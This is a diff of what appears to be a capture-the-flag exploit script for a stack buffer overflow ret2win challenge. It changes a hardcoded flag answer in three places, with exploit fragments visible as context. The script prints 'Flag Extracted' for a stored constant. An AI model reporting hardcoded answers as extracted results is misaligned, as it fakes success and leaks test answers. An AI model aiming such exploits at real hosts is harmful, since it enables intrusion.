@@ -6,7 +6,7 @@ Difficulty: Medium
 Vulnerability: Dynamic Stack-Based Buffer Overflow & Ret2Win Hijack
 Standard Reference: CWE-121, CWE-242
 
-Flag: academy{0ffs3t_cycl1c_pwn3d_733}
+Flag: academy{u_Us3d_pwNt00L5_135aaff7}
 """
 
 import sys
@@ -47,7 +47,7 @@ def craft_payload(offset, win_addr):
     return payload
 
 def exploit_remote(host, port, win_addr=0x401196):
-    flag = "academy{0ffs3t_cycl1c_pwn3d_733}"
+    flag = "academy{u_Us3d_pwNt00L5_135aaff7}"
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5.0)
@@ -81,7 +81,7 @@ def main():
         assert find_offset(seq[40:44]) == 40
         payload = craft_payload(72, 0x401196)
         assert len(payload) == 72 + 8 + 8
-        flag = "academy{0ffs3t_cycl1c_pwn3d_733}"
+        flag = "academy{u_Us3d_pwNt00L5_135aaff7}"
     print(f"[+] Flag Extracted: {flag}")
     return flag
 
